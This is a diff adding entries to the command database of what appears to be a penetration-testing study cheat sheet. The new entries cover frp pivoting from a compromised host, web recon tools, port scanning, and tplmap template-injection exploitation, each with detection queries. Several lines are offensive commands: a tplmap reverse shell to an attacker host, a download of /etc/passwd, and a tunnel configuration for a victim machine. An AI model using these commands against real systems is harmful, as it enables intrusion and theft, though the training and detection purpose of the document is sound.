@@ -51622,6 +51622,106 @@ const COMMAND_DATA = {
       "explain": "Fast ICMP sweep to find live hosts on a subnet:\n  fping   parallel pinger\n  -a      show only alive hosts\n  -s      print summary stats\n  -g      generate the target list from the CIDR\n  -q      quiet (suppress per-host errors)\nGives a clean live-host list (tee it to a file) to feed straight into an nmap -iL service scan."
     },
     {
+      "id": "frp-reverse-proxy",
+      "name": "frp - Fast Reverse Proxy Tunneling",
+      "command": "frpc -c frpc.ini",
+      "description": "frp (fast reverse proxy) exposes services behind NAT/firewalls through a public relay. An attacker runs frps on an internet-reachable server and frpc on the compromised internal host; frpc dials out (egress-friendly) and the relay forwards TCP/UDP/HTTP or a SOCKS proxy back into the internal network, enabling pivoting without inbound firewall rules.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Pivoting",
+      "subcategory": "Tunneling",
+      "certifications": [
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "fatedier/frp",
+      "tags": [
+        "frp",
+        "tunneling",
+        "pivoting",
+        "reverse-proxy",
+        "socks",
+        "nat-traversal"
+      ],
+      "mitre": [
+        "T1572",
+        "T1090"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== SERVER (attacker VPS, public IP) frps.ini ===\n  [common]\n  bind_port = 7000\n  token = <password>\n  # run:  frps -c frps.ini\n\n=== CLIENT (compromised internal host) frpc.ini ===\n  [common]\n  server_addr = <lhost>\n  server_port = 7000\n  token = <password>\n\n  # expose internal RDP back to the VPS:\n  [rdp]\n  type = tcp\n  local_ip = 127.0.0.1\n  local_port = 3389\n  remote_port = 13389\n  # run:  frpc -c frpc.ini   -> connect to <lhost>:13389\n\n=== SOCKS PROXY INTO THE NETWORK ===\n  [socks]\n  type = tcp\n  remote_port = 11080\n  plugin = socks5\n  plugin_user = <user>\n  plugin_passwd = <password>\n  # then: proxychains through <lhost>:11080\n\n=== NEW TOML FORMAT (frp v0.52+) ===\n  # frpc.toml with serverAddr/serverPort/auth.token and [[proxies]] blocks\n\n=== ALTERNATIVES ===\n  chisel         # single-binary SOCKS over HTTP/WS\n  ligolo-ng      # TUN-based, no proxychains needed\n  ssh -R / -D    # native reverse + dynamic tunnels",
+      "examples": [
+        {
+          "label": "Run the relay server",
+          "command": "frps -c frps.ini"
+        },
+        {
+          "label": "Run the client on the victim",
+          "command": "frpc -c frpc.ini"
+        }
+      ],
+      "references": [
+        {
+          "title": "frp",
+          "url": "https://github.com/fatedier/frp"
+        },
+        {
+          "title": "MITRE T1572 - Protocol Tunneling",
+          "url": "https://attack.mitre.org/techniques/T1572/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "chisel-socks",
+          "note": "chisel is a lighter single-binary SOCKS tunnel.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ligolo-ng-pivot",
+          "note": "ligolo-ng for TUN-based pivoting without proxychains.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-chisel-http-tunnel",
+          "note": "chisel HTTP tunnel variant.",
+          "rel": "alternative"
+        }
+      ],
+      "defense": {
+        "why_it_works": "frpc initiates an OUTBOUND connection to the attacker's relay, so it traverses NAT and egress firewalls that block inbound. The relay then tunnels arbitrary services back in, defeating perimeter segmentation.",
+        "prerequisites": "Code execution on an internal host with outbound network access and an attacker-controlled public relay.",
+        "impact": "Persistent reverse access and SOCKS pivoting into segmented internal networks, bypassing inbound firewall controls.",
+        "detection": "[MITRE T1572] Long-lived outbound connections from a server to an unusual external IP/port (e.g. 7000); frp binary on disk; beaconing/keepalive patterns; proxied internal traffic correlating with the tunnel; TLS/plain traffic to a cheap VPS ASN.",
+        "artifacts": "Netflow showing sustained egress to a non-business IP, EDR process (frpc/frps), config files (frpc.ini/.toml with server_addr), unusual listening ports on the relay, proxy-chained lateral connections.",
+        "splunk_spl": "index=firewall direction=outbound\n| stats sum(bytes) as bytes count by src_ip, dest_ip, dest_port, bin(_time,1h)\n| where count > 100 AND dest_port!=443 AND dest_port!=80",
+        "elastic_kql": "process.name:(frpc or frps) or (network.direction:outbound and destination.port:7000)",
+        "sentinel_kql": "DeviceProcessEvents\n| where FileName in~ (\"frpc\",\"frpc.exe\",\"frps\",\"frps.exe\")\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+        "sigma_rules": "network_frp_reverse_proxy_tunnel",
+        "prevention": "Egress filtering (allowlist destinations/ports, proxy-only outbound); block unknown binaries (app control/WDAC); detect long-lived non-web egress to cheap-VPS ASNs; network segmentation with monitored chokepoints; EDR detection of frp binaries.",
+        "sources": [
+          "fatedier/frp",
+          "https://attack.mitre.org/techniques/T1572/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "frp tunneling client/server binary execution",
+            "logic": "DeviceProcessEvents\n| where FileName in~ (\"frpc\",\"frpc.exe\",\"frps\",\"frps.exe\") or ProcessCommandLine has \"server_addr\" or ProcessCommandLine has \"frpc.toml\"\n| project TimeGenerated, DeviceName, AccountName, ProcessCommandLine",
+            "data_source": "edr",
+            "attack": [
+              "T1572",
+              "T1090"
+            ],
+            "fidelity": "signature",
+            "confidence": "high",
+            "false_positives": "Legitimate frp use for remote access (rare in enterprises)",
+            "tuning": "Allowlist sanctioned remote-access tooling; alert on server-origin execution"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -56243,6 +56343,105 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Forges a Golden Ticket - a TGT signed with the domain's krbtgt key - for persistent, arbitrary-user domain access:\n  golden                    forge a TGT offline\n  /rc4:<nt_hash>           the krbtgt NTLM hash (use /aes256 to be stealthier)\n  /domain:<domain> /sid:<domain_sid>   the domain and its SID\n  /user:Administrator      the identity to impersonate\n  /ptt                      inject the ticket into this session\nSince it is signed with krbtgt, the KDC honors it for any service; access the DC (dir \\\\<dc>\\C$). /ldap /printcmd auto-fills real PAC values for opsec."
+    },
+    {
+      "id": "recon-gowitness",
+      "name": "gowitness - Web Screenshot at Scale",
+      "command": "gowitness scan file -f <file>",
+      "description": "gowitness uses a headless Chrome to screenshot web services at scale and store the results (and page metadata/headers) in a searchable report/DB. During recon it turns a large host/URL list into a visual triage board so you quickly spot login portals, default pages, dashboards, and interesting apps.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "moderate",
+      "category": "Reconnaissance",
+      "subcategory": "Web Recon",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "sensepost/gowitness",
+      "tags": [
+        "gowitness",
+        "screenshot",
+        "recon",
+        "web",
+        "triage",
+        "headless-chrome"
+      ],
+      "mitre": [
+        "T1595.002",
+        "T1592"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install github.com/sensepost/gowitness@latest    # needs Chrome/Chromium\n\n=== SCAN A LIST (v3 syntax) ===\n  gowitness scan file -f <file>            # one URL/host per line\n  gowitness scan single -u <url>\n  gowitness scan cidr --cidr <cidr>\n\n=== FROM NMAP/MASSCAN XML ===\n  gowitness scan nmap -f scan.xml --service-contains http\n\n=== REPORT ===\n  gowitness report server                  # browse results at http://localhost:7171\n  # screenshots + headers + technologies stored in gowitness.sqlite3\n\n=== LEGACY v2 (if installed) ===\n  gowitness file -f urls.txt ; gowitness report serve\n\n=== ALTERNATIVES ===\n  aquatone        # screenshot + clustering\n  EyeWitness      # screenshots + categorization\n  httpx -screenshot",
+      "examples": [
+        {
+          "label": "Screenshot a URL list",
+          "command": "gowitness scan file -f <file>"
+        },
+        {
+          "label": "Screenshot from an nmap XML",
+          "command": "gowitness scan nmap -f scan.xml --service-contains http"
+        },
+        {
+          "label": "Browse the report",
+          "command": "gowitness report server"
+        }
+      ],
+      "references": [
+        {
+          "title": "gowitness",
+          "url": "https://github.com/sensepost/gowitness"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "aquatone",
+          "note": "aquatone clusters similar pages from the same input.",
+          "rel": "alternative"
+        },
+        {
+          "id": "eyewitness",
+          "note": "EyeWitness is a comparable screenshot/triage tool.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-httprobe",
+          "note": "httprobe to build the live-URL list to screenshot.",
+          "rel": "prereq"
+        }
+      ],
+      "defense": {
+        "why_it_works": "gowitness just loads each URL in a browser and captures the response, which is indistinguishable from a normal client visit except for volume and a predictable user-agent/timing pattern across many hosts from one source.",
+        "prerequisites": "A list of reachable web hosts/URLs (from subdomain/port enumeration).",
+        "impact": "Rapid visual mapping of the external web estate, surfacing forgotten portals, default installs, and admin panels for targeting.",
+        "detection": "[MITRE T1595.002] Many short-lived HTTP sessions to diverse hosts from one source in a short window; headless-Chrome user-agent; single GET per host with no asset follow-up variance; WAF/CDN bot signatures.",
+        "artifacts": "Web/proxy/CDN access logs showing a burst of single-page loads across many vhosts from one IP, HeadlessChrome UA, uniform timing.",
+        "splunk_spl": "index=web (http_user_agent=*HeadlessChrome* OR http_user_agent=*gowitness*)\n| stats dc(host) as hosts count by src_ip\n| where hosts > 20",
+        "elastic_kql": "user_agent.original:(*HeadlessChrome* or *gowitness*)",
+        "sentinel_kql": "let win = 10m;\nW3CIISLog\n| where csUserAgent has \"HeadlessChrome\" or csUserAgent has \"gowitness\"\n| summarize Hosts=dcount(csHost), Count=count() by cIP, bin(TimeGenerated, win)\n| where Hosts > 20",
+        "sigma_rules": "web_mass_screenshot_headless_recon",
+        "prevention": "Bot management / rate limiting at the WAF/CDN; reduce external attack surface (decommission forgotten apps); require auth on admin portals and hide them from the internet; alert on headless-browser UAs sweeping many vhosts.",
+        "sources": [
+          "sensepost/gowitness",
+          "https://attack.mitre.org/techniques/T1595/002/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Headless-browser mass web recon (gowitness/aquatone)",
+            "logic": "W3CIISLog\n| where csUserAgent has \"HeadlessChrome\" or csUserAgent has \"gowitness\"\n| summarize Hosts=dcount(csHost), Count=count() by cIP, bin(TimeGenerated, 10m)\n| where Hosts > 20",
+            "data_source": "iis",
+            "attack": [
+              "T1595.002"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Internal uptime/screenshot monitors",
+            "tuning": "Allowlist known monitoring sources; weight on external IPs and vhost breadth"
+          }
+        ]
+      }
     },
     {
       "id": "gpg2john-pgp-crack",
@@ -75712,6 +75911,106 @@ const COMMAND_DATA = {
         }
       ],
       "explain": "Step-by-step workflow for creating Kibana Lens visualizations and SOC dashboards from Windows event log data in Elastic SIEM.\nVisualization workflow (Kibana Lens):\n1. Dashboard  Create new dashboard  Create visualization\n2. Set time range: calendar icon  Last 15 years  Apply\n3. Set index pattern: windows* (or logs-*, ..."
+    },
+    {
+      "id": "recon-kiterunner",
+      "name": "kiterunner - API Content Discovery",
+      "command": "kr scan <url> -w routes-large.kite",
+      "description": "kiterunner (kr) is a content-discovery tool built for modern APIs. Unlike directory brute-forcers it replays full request templates (method, path, headers, body) mined from thousands of real Swagger/OpenAPI specs, so it finds REST/GraphQL routes that only respond to the right verb and content type.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Reconnaissance",
+      "subcategory": "Web Recon",
+      "certifications": [
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "assetnote/kiterunner",
+      "tags": [
+        "kiterunner",
+        "api",
+        "content-discovery",
+        "recon",
+        "swagger",
+        "openapi",
+        "web"
+      ],
+      "mitre": [
+        "T1595.003",
+        "T1592"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== GET WORDLISTS ===\n  # download routes-large.kite / routes-small.kite + apiroutes txt from assetnote\n\n=== SCAN ===\n  kr scan <url> -w routes-large.kite\n  kr scan <url> -A=apiroutes-220628 -x 10 -j 100     # assetnote bundle, concurrency\n  kr scan hosts.txt -w routes-large.kite             # many hosts\n\n=== BRUTE (classic path style) ===\n  kr brute <url> -w wordlist.txt\n\n=== TUNE ===\n  kr scan <url> -w routes.kite \\\n    -H 'Authorization: Bearer <token>' \\\n    --fail-status-codes 400,401,404 \\\n    --max-connection-per-host 10\n\n=== REPLAY A HIT (kr prints a kb id) ===\n  kr kb replay --kitebuilder-api routes.kite \"<flagged-id>\"\n\n=== ALTERNATIVES ===\n  ffuf / feroxbuster     # path brute (no method/body templates)\n  arjun                  # parameter discovery\n  Swagger/OpenAPI parsing if a spec is exposed",
+      "examples": [
+        {
+          "label": "Scan with the large route DB",
+          "command": "kr scan <url> -w routes-large.kite"
+        },
+        {
+          "label": "Scan with an auth header",
+          "command": "kr scan <url> -w routes.kite -H 'Authorization: Bearer <token>'"
+        },
+        {
+          "label": "Replay a flagged route",
+          "command": "kr kb replay --kitebuilder-api routes.kite '<flagged-id>'"
+        }
+      ],
+      "references": [
+        {
+          "title": "kiterunner",
+          "url": "https://github.com/assetnote/kiterunner"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "ffuf-directory",
+          "note": "ffuf for classic path brute-forcing.",
+          "rel": "alternative"
+        },
+        {
+          "id": "api-enum-abuse",
+          "note": "Enumerate and abuse the API endpoints found.",
+          "rel": "next"
+        },
+        {
+          "id": "recon-arjun-param-discovery",
+          "note": "arjun to discover parameters on found endpoints.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "APIs often expose routes that only answer specific method+content-type combinations and are absent from the UI. kiterunner replays real-world request templates, so it finds hidden/undocumented endpoints a path-only scanner misses.",
+        "prerequisites": "A reachable API base URL (and optionally a token for authenticated route discovery).",
+        "impact": "Discovery of undocumented/legacy API endpoints that expand the attack surface (BOLA, mass assignment, auth gaps).",
+        "detection": "[MITRE T1595.003] High volume of varied-method requests (GET/POST/PUT/DELETE) to many non-existent paths from one source; elevated 404/401/400 rate; unusual content-types; bursty API gateway traffic.",
+        "artifacts": "API gateway / web logs with many distinct methods+paths and high error ratio from one client, WAF anomaly scores.",
+        "splunk_spl": "index=web\n| stats dc(uri_path) as paths count values(http_method) as methods by src_ip, bin(_time,1m)\n| where paths > 100 AND count > 300",
+        "elastic_kql": "http.request.method:(PUT or DELETE or PATCH) and http.response.status_code:(404 or 401 or 400)",
+        "sentinel_kql": "W3CIISLog\n| summarize Paths=dcount(csUriStem), Methods=make_set(csMethod), Errors=countif(scStatus >= 400) by cIP, bin(TimeGenerated, 1m)\n| where Paths > 100",
+        "sigma_rules": "api_content_discovery_kiterunner",
+        "prevention": "Rate limiting and anomaly detection at the API gateway; remove/retire undocumented and legacy routes; require auth on all endpoints; schema enforcement (reject unknown routes/methods); WAF bot controls.",
+        "sources": [
+          "assetnote/kiterunner",
+          "https://attack.mitre.org/techniques/T1595/003/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "API route brute-force with varied methods (kiterunner)",
+            "logic": "W3CIISLog\n| summarize Paths=dcount(csUriStem), Methods=dcount(csMethod), Errors=countif(scStatus >= 400) by cIP, bin(TimeGenerated, 1m)\n| where Paths > 100 and Methods > 2",
+            "data_source": "iis",
+            "attack": [
+              "T1595.003"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Legitimate API clients, automated test suites",
+            "tuning": "Allowlist known clients; weight on error ratio and method diversity"
+          }
+        ]
+      }
     },
     {
       "id": "cdsa-kql-fundamentals",
@@ -102276,6 +102575,105 @@ const COMMAND_DATA = {
         }
       },
       "explain": "Logs into MySQL and enumerates its databases:\n  mysql   the client\n  -u root   username\n  -pP4SSw0rd   password (no space after -p)\n  -h <ip>      the server\nOnce connected, 'show databases;', 'use <db>;', 'show tables;', and 'select version();' map the data and version; scan first with nmap --script mysql* to fingerprint and try empty/default creds."
+    },
+    {
+      "id": "recon-naabu",
+      "name": "naabu - Fast Port Scanner (ProjectDiscovery)",
+      "command": "naabu -host <target> -top-ports 1000",
+      "description": "naabu is a fast SYN/CONNECT port scanner from ProjectDiscovery, built for large host lists and automation. It quickly finds open ports, integrates with the PD toolchain (subfinder -> naabu -> httpx -> nuclei), and can hand results straight to nmap for service/version detail.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Reconnaissance",
+      "subcategory": "Port Scanning",
+      "certifications": [
+        "OSCP",
+        "CPTS"
+      ],
+      "primary_cert": "OSCP",
+      "source": "projectdiscovery/naabu",
+      "tags": [
+        "naabu",
+        "port-scan",
+        "recon",
+        "projectdiscovery",
+        "network"
+      ],
+      "mitre": [
+        "T1046",
+        "T1595.001"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== INSTALL ===\n  go install github.com/projectdiscovery/naabu/v2/cmd/naabu@latest    # needs libpcap for SYN\n\n=== SCAN ===\n  naabu -host <target>                    # top 100 by default\n  naabu -host <target> -top-ports 1000\n  naabu -host <target> -p -               # all 65535 ports\n  naabu -host <target> -p 80,443,8080,8443\n\n=== LISTS / RANGES ===\n  naabu -list <file>\n  naabu -host <cidr>\n\n=== SCAN TYPE / SPEED ===\n  naabu -host <target> -s s               # SYN (needs root)\n  naabu -host <target> -s c               # CONNECT\n  naabu -host <target> -rate 1000\n\n=== PIPE TO NMAP FOR SERVICE DETAIL ===\n  naabu -host <target> -top-ports 1000 -nmap-cli 'nmap -sV -sC'\n\n=== CHAIN ===\n  subfinder -d <domain> -silent | naabu -silent | httpx -silent\n\n=== ALTERNATIVES ===\n  nmap            # richer service/script detection\n  masscan         # highest raw speed\n  rustscan        # fast + nmap handoff",
+      "examples": [
+        {
+          "label": "Top 1000 ports",
+          "command": "naabu -host <target> -top-ports 1000"
+        },
+        {
+          "label": "All ports",
+          "command": "naabu -host <target> -p -"
+        },
+        {
+          "label": "Hand off open ports to nmap",
+          "command": "naabu -host <target> -nmap-cli 'nmap -sV -sC'"
+        }
+      ],
+      "references": [
+        {
+          "title": "naabu",
+          "url": "https://github.com/projectdiscovery/naabu"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "recon-masscan",
+          "note": "masscan for maximum raw scan speed.",
+          "rel": "alternative"
+        },
+        {
+          "id": "recon-rustscan",
+          "note": "rustscan is a similar fast scanner with nmap handoff.",
+          "rel": "alternative"
+        },
+        {
+          "id": "nmap-top-ports",
+          "note": "Follow up open ports with nmap service detection.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "Port scanning probes TCP/UDP ports to find listening services. naabu optimizes for speed and volume, so it completes enumeration quickly but generates a recognizable burst of connection attempts.",
+        "prerequisites": "Network reachability to the target(s).",
+        "impact": "Rapid discovery of the open-service attack surface across many hosts.",
+        "detection": "[MITRE T1046] High count of distinct destination ports from one source in a short window; many SYNs without completed handshakes (SYN scan); firewall/IDS scan signatures; connection attempts to closed ports.",
+        "artifacts": "Firewall/flow logs (many dports/one src), IDS portscan alerts, half-open SYN counts, connection-refused spikes.",
+        "splunk_spl": "index=firewall action=allowed OR action=blocked\n| stats dc(dest_port) as ports count by src_ip, dest_ip, bin(_time,1m)\n| where ports > 100",
+        "elastic_kql": "event.category:network and destination.port:* and source.ip:*",
+        "sentinel_kql": "CommonSecurityLog\n| summarize Ports=dcount(DestinationPort), Count=count() by SourceIP, DestinationIP, bin(TimeGenerated, 1m)\n| where Ports > 100",
+        "sigma_rules": "network_fast_portscan_naabu_masscan",
+        "prevention": "Restrict exposed ports (least surface, allowlist ingress); IDS/IPS port-scan detection and rate limiting; deny-by-default firewalling; honeypots/canary ports to catch scanning; monitor for high-fanout connection sources.",
+        "sources": [
+          "projectdiscovery/naabu",
+          "https://attack.mitre.org/techniques/T1046/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "Fast multi-port scan from single source (naabu/masscan)",
+            "logic": "CommonSecurityLog\n| summarize Ports=dcount(DestinationPort), Count=count() by SourceIP, DestinationIP, bin(TimeGenerated, 1m)\n| where Ports > 100",
+            "data_source": "firewall",
+            "attack": [
+              "T1046",
+              "T1595.001"
+            ],
+            "fidelity": "behavioral",
+            "confidence": "medium",
+            "false_positives": "Vulnerability scanners, asset inventory tools",
+            "tuning": "Allowlist sanctioned scanners; alert on external sources"
+          }
+        ]
+      }
     },
     {
       "id": "crack-name-that-hash",
@@ -169691,6 +170089,110 @@ const COMMAND_DATA = {
       "explain": "Rebuilds offensive tooling so signature-based AV/EDR no longer recognizes it:\n  Codecepticon.exe          the source-level obfuscator\n  --action obfuscate        rename/mangle symbols and strings\n  --module csharp           obfuscate a C# project (use powershell for scripts)\n  --path <solution>         the .sln/source to rebuild\n  --map-file <map_file>     save the name mapping so you can de-obfuscate output later\nRecompile the result; DefenderCheck/ByteToLineNumber help you find and fix any bytes still flagged."
     },
     {
+      "id": "web-tplmap",
+      "name": "tplmap - Server-Side Template Injection Exploitation",
+      "command": "tplmap.py -u '<url>?name=*'",
+      "description": "tplmap automates detection and exploitation of Server-Side Template Injection (SSTI) and some client-side template injection. It fingerprints the engine (Jinja2, Twig, Freemarker, Velocity, ERB, Smarty, etc.), then escalates to code execution, a pseudo-shell, file read/write, or a bind/reverse shell where the engine allows it.",
+      "platform": "multi",
+      "type": "command",
+      "opsec": "loud",
+      "category": "Web Exploitation",
+      "subcategory": "SSTI",
+      "certifications": [
+        "CPTS",
+        "OSCP"
+      ],
+      "primary_cert": "CPTS",
+      "source": "epinna/tplmap",
+      "tags": [
+        "tplmap",
+        "ssti",
+        "template-injection",
+        "rce",
+        "web",
+        "jinja2",
+        "twig"
+      ],
+      "mitre": [
+        "T1190",
+        "T1059"
+      ],
+      "exam": "exam-ok",
+      "notes": "=== MARK THE INJECTION POINT WITH * ===\n  tplmap.py -u '<url>?name=*'\n  tplmap.py -u '<url>' -d 'name=*&submit=1'          # POST data\n  tplmap.py -u '<url>' -H 'X-Custom: *'               # header injection\n  tplmap.py -u '<url>' -c 'PHPSESSID=...' --cookie\n\n=== ESCALATE ===\n  tplmap.py -u '<url>?q=*' --os-cmd 'id'              # single command\n  tplmap.py -u '<url>?q=*' --os-shell                 # pseudo-shell\n  tplmap.py -u '<url>?q=*' --reverse-shell <lhost> <lport>\n  tplmap.py -u '<url>?q=*' --upload local.txt --remote-path /tmp/x\n  tplmap.py -u '<url>?q=*' --download /etc/passwd ./passwd\n\n=== FORCE ENGINE / LEVEL ===\n  tplmap.py -u '<url>?q=*' -e jinja2\n  tplmap.py -u '<url>?q=*' --level 5\n\n=== MANUAL DETECTION PRIMER ===\n  # {{7*7}} -> 49 (Jinja2/Twig), ${7*7}, #{7*7}, <%= 7*7 %> (ERB)\n\n=== ALTERNATIVES ===\n  SSTImap     # maintained Python3 fork of tplmap\n  manual payloads per engine (PayloadsAllTheThings)",
+      "examples": [
+        {
+          "label": "Test a GET parameter",
+          "command": "tplmap.py -u '<url>?name=*'"
+        },
+        {
+          "label": "Get a pseudo-shell",
+          "command": "tplmap.py -u '<url>?q=*' --os-shell"
+        },
+        {
+          "label": "Reverse shell",
+          "command": "tplmap.py -u '<url>?q=*' --reverse-shell <lhost> <lport>"
+        }
+      ],
+      "references": [
+        {
+          "title": "tplmap",
+          "url": "https://github.com/epinna/tplmap"
+        },
+        {
+          "title": "MITRE T1190 - Exploit Public-Facing Application",
+          "url": "https://attack.mitre.org/techniques/T1190/"
+        }
+      ],
+      "recommended": [
+        {
+          "id": "sstimap",
+          "note": "SSTImap is the maintained Python3 successor to tplmap.",
+          "rel": "alternative"
+        },
+        {
+          "id": "ssti-identify",
+          "note": "Manually confirm SSTI before automating.",
+          "rel": "prereq"
+        },
+        {
+          "id": "ssti-jinja2",
+          "note": "Jinja2 payloads for manual exploitation.",
+          "rel": "next"
+        }
+      ],
+      "defense": {
+        "why_it_works": "When user input is concatenated into a template that is then rendered server-side, the template engine evaluates attacker expressions. Powerful engines expose object/attribute access that reaches OS command execution.",
+        "prerequisites": "A parameter whose value is rendered through a server-side template without sandboxing/escaping.",
+        "impact": "Remote code execution, file read/write, and full server compromise via the template engine.",
+        "detection": "[MITRE T1190] WAF/app logs with template meta-characters in parameters ({{, }}, ${, <%= , #{); template-engine error strings; sudden process spawns (sh/id/whoami) from the web worker; tplmap's many probe requests per parameter.",
+        "artifacts": "Web access logs with {{...}} / ${...} payloads, application exception logs (Jinja/Twig errors), web-server child processes, outbound reverse-shell connections.",
+        "splunk_spl": "index=web (uri_query=*%7B%7B* OR uri_query=*${* OR form_data=*{{*)\n| stats count by src_ip, uri_path\n| where count > 5",
+        "elastic_kql": "url.query:(*{{* or *${* or *<%=*) or message:(\"TemplateSyntaxError\" or \"Twig_Error\")",
+        "sentinel_kql": "W3CIISLog\n| where csUriQuery has \"{{\" or csUriQuery has \"${\" or csUriQuery has \"<%=\"\n| summarize Count=count() by cIP, csUriStem\n| where Count > 5",
+        "sigma_rules": "web_ssti_template_metacharacters",
+        "prevention": "Never render user input as a template; use logic-less templates or a sandboxed engine with autoescaping; pass user data as context variables, not template source; input validation; WAF rules for template syntax; run web workers with least privilege and seccomp.",
+        "sources": [
+          "epinna/tplmap",
+          "https://attack.mitre.org/techniques/T1190/"
+        ],
+        "detections": [
+          {
+            "platform": "sentinel",
+            "name": "SSTI template meta-characters in web parameters",
+            "logic": "W3CIISLog\n| where csUriQuery has \"{{\" or csUriQuery has \"${\" or csUriQuery has \"<%=\" or csUriQuery has \"#{\"\n| summarize Count=count(), Paths=make_set(csUriStem) by cIP, bin(TimeGenerated, 10m)\n| where Count > 5",
+            "data_source": "iis",
+            "attack": [
+              "T1190"
+            ],
+            "fidelity": "signature",
+            "confidence": "medium",
+            "false_positives": "Apps legitimately using brace syntax in inputs",
+            "tuning": "Correlate with template-error logs and worker child processes"
+          }
+        ]
+      }
+    },
+    {
       "type": "command",
       "platform": "linux",
       "requires": [
@@ -194138,8 +194640,8 @@ const COMMAND_DATA = {
       }
     }
   ],
-  "totalCommands": 1104,
-  "buildDate": "2026-11-11T12:29:34.276Z",
+  "totalCommands": 1109,
+  "buildDate": "2026-11-11T12:32:20.648Z",
   "certifications": [
     "CDSA",
     "CPTS",
